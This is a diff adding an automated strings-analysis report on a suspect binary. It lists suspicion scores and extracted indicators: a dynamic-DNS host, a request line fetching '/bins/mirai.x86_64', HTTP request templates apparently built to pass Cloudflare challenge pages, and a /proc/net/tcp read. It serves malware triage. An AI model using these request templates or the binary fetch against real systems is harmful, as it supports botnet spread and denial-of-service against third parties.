@@ -1,0 +1,121 @@
+=============================================================================
+========	BINARY ID :16f8fd5935d74e69e91e3eb1f82f575afddb4ea5==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :18535
+SUPSCPECTED LINES COUNT :75
+SUPSCPECTED STRINGS COUNT (DISTINCT) :13
+SUPSCPECTED STRINGS WEIGHT :46
+SUSPECT STRING SCORE : [46 / 150] 30%
+USER AGENTS STRINGS COUNT :7
+STATIC IPs STRINGS COUNT :0
+DYNAMIC IPs STRINGS COUNT :0
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+%ÿ㌀ె숱킉蠘ు킉冈섏შ䆈褍쇐ࣨ䆈嬎䅝䅜䅝䅞썟晦遦晦遦晦遦晦䆐䱗㶍१\t噁赌帵ऑ䄀䱕ⶍ
+ HTTP/1.1\r\nUser-Agent: 
+\r\nHost: 
+http
+https
+HTTP
+jbeupq84v7.2y.net
+GET /g.php HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n
+GET /cdn-cgi/l/chk_captcha?id=%s&g-recaptcha-response=%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nReferer: http://%s/\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+GET /%s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\n
+GET %s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nReferer: http://%s\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+POST / HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: %d\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: %s\r\ncookie: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\nq=%s
+GET /cdn-cgi/l/chk_jschl?jschl_vc=%s&pass=%s&jschl_answer=%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nReferer: http://%s/\r\nCookie: %s\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+GET %s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+GET /%s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\n
+https://%[^/]/%s
+/proc/net/tcp
+abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ0123456789
+abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ
+abcdefghijklmnopqrstuvw012345678
+GET /bins/mirai.x86_64 HTTP/1.0\r\n\r\n
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ssl/s3_cbc.c
+ssl/s3_msg.c
+assertion failed: s->d1->w_msg_hdr.msg_len + ((s->version == DTLS1_BAD_VER) ? 3 : DTLS1_CCS_HEADER_LENGTH) == (unsigned int)s->init_num
+assertion failed: s->d1->w_msg_hdr.msg_len + DTLS1_HM_HEADER_LENGTH == (unsigned int)s->init_num
+assertion failed: ((long)msg_hdr->msg_len) > 0
+assertion failed: s->init_num == (int)s->d1->w_msg_hdr.msg_len + DTLS1_HM_HEADER_LENGTH
+assertion failed: !(meth->ext_flags & SSL_EXT_FLAG_SENT)
+ssl/d1_msg.c
+tlsext_hostname
+no_legacy_server_connect
+CipherString
+dtls1_preprocess_fragment
+dtls1_process_record
+dtls_process_hello_verify
+ssl_cipher_process_rulestr
+ssl_scan_clienthello_tlsext
+ssl_scan_serverhello_tlsext
+ssl_start_async_job
+tls_post_process_client_hello
+tls_process_cert_status
+tls_process_cert_verify
+tls_process_cke_dhe
+tls_process_cke_ecdhe
+tls_process_cke_gost
+tls_process_cke_psk_preamble
+tls_process_cke_rsa
+tls_process_cke_srp
+tls_process_client_hello
+tls_process_finished
+tls_process_key_exchange
+tls_process_next_proto
+tls_process_server_done
+tls_process_server_hello
+tls_process_ske_dhe
+tls_process_ske_ecdhe
+tls_process_ske_psk_preamble
+tls_process_ske_srp
+connection type not set
+failed to init async
+https proxy request
+http request
+dtls1_process_buffered_records
+tls_post_process_client_key_exchange
+tls_process_certificate_request
+tls_process_change_cipher_spec
+tls_process_client_certificate
+tls_process_client_key_exchange
+tls_process_new_session_ticket
+tls_process_server_certificate
+crypto/async/async.c
+crypto/async/async_wait.c
+host=
+\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+GET /g.php HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n
+GET /cdn-cgi/l/chk_captcha?id=%s&g-recaptcha-response=%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nReferer: http://%s/\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+GET %s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nReferer: http://%s\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+POST / HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: %d\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: %s\r\ncookie: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\nq=%s
+GET /cdn-cgi/l/chk_jschl?jschl_vc=%s&pass=%s&jschl_answer=%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nReferer: http://%s/\r\nCookie: %s\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+GET %s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nAccept: */*\r\nUpgrade-Insecure-Requests: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n
+GET /%s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/net/tcp
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
